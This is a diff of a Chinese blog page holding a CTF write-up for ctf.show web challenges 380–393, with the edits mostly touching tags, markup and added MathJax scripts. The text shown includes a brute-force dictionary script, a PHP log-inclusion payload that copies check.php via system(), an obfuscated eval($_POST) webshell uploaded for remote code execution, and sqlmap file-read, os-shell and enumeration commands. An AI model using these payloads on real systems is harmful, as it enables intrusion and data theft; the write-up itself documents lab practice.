@@ -80,7 +80,7 @@
 	        
 				<li><a href="/tags/%E6%AF%94%E8%B5%9BWP">比赛WP</a></li>
 	        
-				<li><a href="/tags/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB">技术分享</a></li>
+				<li><a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</a></li>
 	        
 			</ul>
 		</nav>
@@ -166,7 +166,7 @@
 		        
 					<li style="width: 25%"><a href="/tags/%E6%AF%94%E8%B5%9BWP">比赛WP</a></li>
 		        
-					<li style="width: 25%"><a href="/tags/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB">技术分享</a></li>
+					<li style="width: 25%"><a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</a></li>
 		        
 				</ul>
 			</nav>
@@ -203,7 +203,6 @@
       
         <p>中期测评和终极考核做自闭了，花了一天时间做这个，也学到了挺多东西，把一些笔记放上来吧<br><img src="https://img-blog.csdnimg.cn/73daf8d9227c4067890020c6eb761e38.png" alt="在这里插入图片描述"></p>
 <span id="more"></span>
-
 <h1 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h1><p>1.首先查看源码，没有发现什么有用的东西</p>
 <p>2.尝试常见敏感目录，也没发现什么有用的东西</p>
 <p>3.随便点进一篇文章，发现目录为page_x.php（x=1, 2, 3, 4）</p>
@@ -230,7 +229,6 @@
 <h1 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h1><p>1.同样的页面，继续访问/alsckdfy，得到同样的登录框</p>
 <p>2.这次不能用万能密码绕过了，根据提示”密码前2位是小写字母，后三位是数字“，自己生成字典</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;384_dic.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">StrLetter = string.ascii_lowercase</span><br><span class="line">StrNum = string.digits</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span>  <span class="comment"># xy123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l1 <span class="keyword">in</span> StrLetter:</span><br><span class="line">    <span class="keyword">for</span> l2 <span class="keyword">in</span> StrLetter:</span><br><span class="line">		<span class="keyword">for</span> n1 <span class="keyword">in</span> StrNum:</span><br><span class="line">			<span class="keyword">for</span> n2 <span class="keyword">in</span> StrNum:</span><br><span class="line">				<span class="keyword">for</span> n3 <span class="keyword">in</span> StrNum:</span><br><span class="line">					password = l1 + l2 + n1 + n2 + n3</span><br><span class="line">					f.write(password + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-
 <p>3.利用bp进行爆破，用得到的密码登录即可得到flag</p>
 <blockquote>
 <p>username:admin</p>
@@ -270,7 +268,7 @@
 <p>11.在各个目录都找不到flag，猜测flag在登录成功的页面中</p>
 <p>12.继续日志包含，将/alsckdfy/check.php中的内容读出</p>
 <blockquote>
-<?php system('cat /var/www/html/alsckdfy/check.php >/var/www/html/2.txt');?>
+<p>&lt;?php system(‘cat /var/www/html/alsckdfy/check.php &gt;/var/www/html/2.txt’);?&gt;</p>
 </blockquote>
 <p>13.在/alsckdfy/check.php中得到flag</p>
 <h1 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h1><p>1.387的方法不能用了，寻找别的方法</p>
@@ -278,7 +276,6 @@
 <p>3.访问/alsckdfy/editor/，发现编辑器</p>
 <p>4.上传木马，并把后缀改为.zip</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>文件路径：/alsckdfy/attached/file/20211122/20211122084947_21173.zip</p>
 <p>5.访问/debug/?file=/var/www/html/alsckdfy/attached/file/20211122/20211122084947_21173.zip，将木马写入网站</p>
 <p>6.访问URL/1.php，进行RCE</p>
@@ -293,18 +290,18 @@
 <p>2.随便点进一篇文章，发现注入点”/page.php?id=”</p>
 <p>3.sqlmap一把梭，结果将保存在本地，访问即可得到flag</p>
 <blockquote>
-<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://61433d34-74db-435d-bfcf-b8638d05e9da.challenge.ctf.show/page.php?id=1">http://61433d34-74db-435d-bfcf-b8638d05e9da.challenge.ctf.show/page.php?id=1</a> –file-read /var/www/html/alsckdfy/check.php –batch<br><img src="https://img-blog.csdnimg.cn/f434528703f8403dbe5323caf582f447.png"></p>
-</blockquote>
-<h1 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h1><p>1.继续尝试390的方法，但是注入点不在”/page.php?id=”了，尝试失败</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://61433d34-74db-435d-bfcf-b8638d05e9da.challenge.ctf.show/page.php?id=1">http://61433d34-74db-435d-bfcf-b8638d05e9da.challenge.ctf.show/page.php?id=1</a> —file-read /var/www/html/alsckdfy/check.php —batch<br><img src="https://img-blog.csdnimg.cn/f434528703f8403dbe5323caf582f447.png" alt=""></p>
+<h1 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h1></blockquote>
+<p>1.继续尝试390的方法，但是注入点不在”/page.php?id=”了，尝试失败</p>
 <p>2.随便点进一篇文章，可以在左上角发现标题输入框，输入后发现疑似注入点”/search.php?title=”</p>
 <p>3.sqlmap继续梭，成功梭出来后在本地访问结果文件得到flag</p>
 <blockquote>
-<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://1702fa8b-3d75-4d23-ae02-6d338e6fe116.challenge.ctf.show/search.php?title=1">http://1702fa8b-3d75-4d23-ae02-6d338e6fe116.challenge.ctf.show/search.php?title=1</a> –file-read /var/www/html/alsckdfy/check.php –batch<br><img src="https://img-blog.csdnimg.cn/19cf402e6e22473684da0be6d88e4008.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<h1 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h1><p>1.继续尝试391的方法，但是梭出来的check.php里面没有flag，尝试失败</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://1702fa8b-3d75-4d23-ae02-6d338e6fe116.challenge.ctf.show/search.php?title=1">http://1702fa8b-3d75-4d23-ae02-6d338e6fe116.challenge.ctf.show/search.php?title=1</a> —file-read /var/www/html/alsckdfy/check.php —batch<br><img src="https://img-blog.csdnimg.cn/19cf402e6e22473684da0be6d88e4008.png" alt="在这里插入图片描述"></p>
+<h1 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h1></blockquote>
+<p>1.继续尝试391的方法，但是梭出来的check.php里面没有flag，尝试失败</p>
 <p>2.但是sqlmap能梭出来文件，说明注入点还是”/search.php?title=”，尝试用sqlmap拿shell</p>
 <blockquote>
-<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://85c6b714-f0f2-4bfa-a07c-318b7d84ea88.challenge.ctf.show/search.php?title=1">http://85c6b714-f0f2-4bfa-a07c-318b7d84ea88.challenge.ctf.show/search.php?title=1</a> –os-shell<br><img src="https://img-blog.csdnimg.cn/4e915f8a349248f3bee3a8242aafab91.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ad8a35a91e7a4766bdb785650e95a4b1.png" alt="在这里插入图片描述"></p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://85c6b714-f0f2-4bfa-a07c-318b7d84ea88.challenge.ctf.show/search.php?title=1">http://85c6b714-f0f2-4bfa-a07c-318b7d84ea88.challenge.ctf.show/search.php?title=1</a> —os-shell<br><img src="https://img-blog.csdnimg.cn/4e915f8a349248f3bee3a8242aafab91.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ad8a35a91e7a4766bdb785650e95a4b1.png" alt="在这里插入图片描述"></p>
 </blockquote>
 <h1 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h1><p>1.继续尝试392的方法，但是不能拿到shell，尝试失败</p>
 <p>2.回到首页，发现最下面有个”搜索引擎”，随便点开一个，发现是百度的页面</p>
@@ -312,12 +309,12 @@
 <p>4.回到/search.php，经过测试存在堆叠注入</p>
 <p>5.用sqlmap查出库名、表名、列名</p>
 <blockquote>
-<p>查库名：python sqlmap.py -u <a target="_blank" rel="noopener" href="http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111">http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111</a> –user-agent=”sqlmap” –dbs</p>
+<p>查库名：python sqlmap.py -u <a target="_blank" rel="noopener" href="http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111">http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111</a> —user-agent=”sqlmap” —dbs</p>
 <p><img src="https://img-blog.csdnimg.cn/f2848b794dbc4ba299c7c848f764dbf3.png" alt="在这里插入图片描述"></p>
-<p>查表名：python sqlmap.py -u <a target="_blank" rel="noopener" href="http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111">http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111</a> –user-agent=”sqlmap” -D “ctfshow” –tables</p>
+<p>查表名：python sqlmap.py -u <a target="_blank" rel="noopener" href="http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111">http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111</a> —user-agent=”sqlmap” -D “ctfshow” —tables</p>
 <p><img src="https://img-blog.csdnimg.cn/b593b04433b748249908ce96c94d6286.png" alt="在这里插入图片描述"></p>
-<p>查列名：python sqlmap.py -u <a target="_blank" rel="noopener" href="http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111">http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111</a> –user-agent=”sqlmap” -D “ctfshow” -T “link” –columns</p>
-<p><img src="https://img-blog.csdnimg.cn/98617959c8d5434da782cbc81e936a3e.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-O2jSXXnr-1637649984418)(C:\Users\29166\AppData\Roaming\Typora\typora-user-images\image-20211122224026035.png)]"></p>
+<p>查列名：python sqlmap.py -u <a target="_blank" rel="noopener" href="http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111">http://5ba70703-13a0-4245-b1e3-78f3a1286eec.challenge.ctf.show/search.php?title=111</a> —user-agent=”sqlmap” -D “ctfshow” -T “link” —columns</p>
+<p><img src="https://img-blog.csdnimg.cn/98617959c8d5434da782cbc81e936a3e.png" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-O2jSXXnr-1637649984418)(C:\Users\29166\AppData\Roaming\Typora\typora-user-images\image-20211122224026035.png)\]"></p>
 </blockquote>
 <p>6.回到search.php，进行堆叠注入</p>
 <blockquote>
@@ -617,7 +614,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">技术分享</a>
+                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -778,5 +775,21 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
 
 </div>
   </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
 </html>
